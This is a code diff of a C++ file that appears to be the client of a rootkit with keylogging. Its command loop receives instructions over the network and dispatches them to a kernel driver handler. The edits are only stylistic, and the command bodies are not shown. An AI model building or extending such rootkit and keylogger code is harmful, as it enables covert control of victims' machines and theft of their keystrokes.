@@ -4,7 +4,7 @@
 #include "keylog.h"
 #include <thread>
 
-void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitClient& network_client);
+static void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitClient& network_client);
 
 int main(int argc, const char* argv[]) {
 
@@ -31,13 +31,13 @@ int main(int argc, const char* argv[]) {
 	return 0;
 }
 
-void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitClient& network_client) {
+static void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitClient& network_client) {
 	while (true) {
 
 	std::string buf;
 	network_client.ReceiveText(buf);
 
-	std::cout << "recieved command over network: "<< buf <<std::endl;
+	std::cout << "recieved command over network: "<< buf << "\n";
 
 	if (buf.rfind("$testConnection",0) == 0) {
 
@@ -105,7 +105,7 @@ void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitCli
 		break;
 	}
 	else {
-		std::cout << "command not recognized" << std::endl;
+		std::cout << "command not recognized" << "\n";
 	}
 
 
